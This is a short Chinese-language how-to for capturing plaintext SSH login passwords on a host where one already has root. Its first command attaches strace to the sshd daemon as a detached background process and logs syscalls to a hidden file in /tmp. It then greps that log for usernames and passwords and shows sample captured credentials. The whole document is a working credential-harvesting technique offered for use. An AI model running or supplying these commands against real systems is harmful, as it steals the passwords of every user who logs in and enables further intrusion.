### 获取sshd进程明文密码

1.root权限执行

```bash
# 使用括号执行程序，当前shell退出，执行的程序不会退出
(strace -f -F -p `ps aux|grep "sshd -D"|grep -v grep|awk {'print $2'}` -t -e trace=read,write -s 32 2> /tmp/.sshd.log &)

```

2.查找用户名和密码的正则表达式为`read\(6, ".+\\0\\0\\0\\.+"`

```bash
# 查找用户名和密码
grep -E 'read\(6, ".+\\0\\0\\0\\.+"' /tmp/.sshd.log

# 结果形式如下
[pid  2401] 22:34:34 read(6, "\10\0\0\0\4root", 9) = 9
[pid  2401] 22:34:34 read(6, "\4\0\0\0\16ssh-connection\0\0\0\0\0\0\0\0", 27) = 27
[pid  2401] 22:34:34 read(6, "\f\0\0\0\4toor", 9) = 9

```

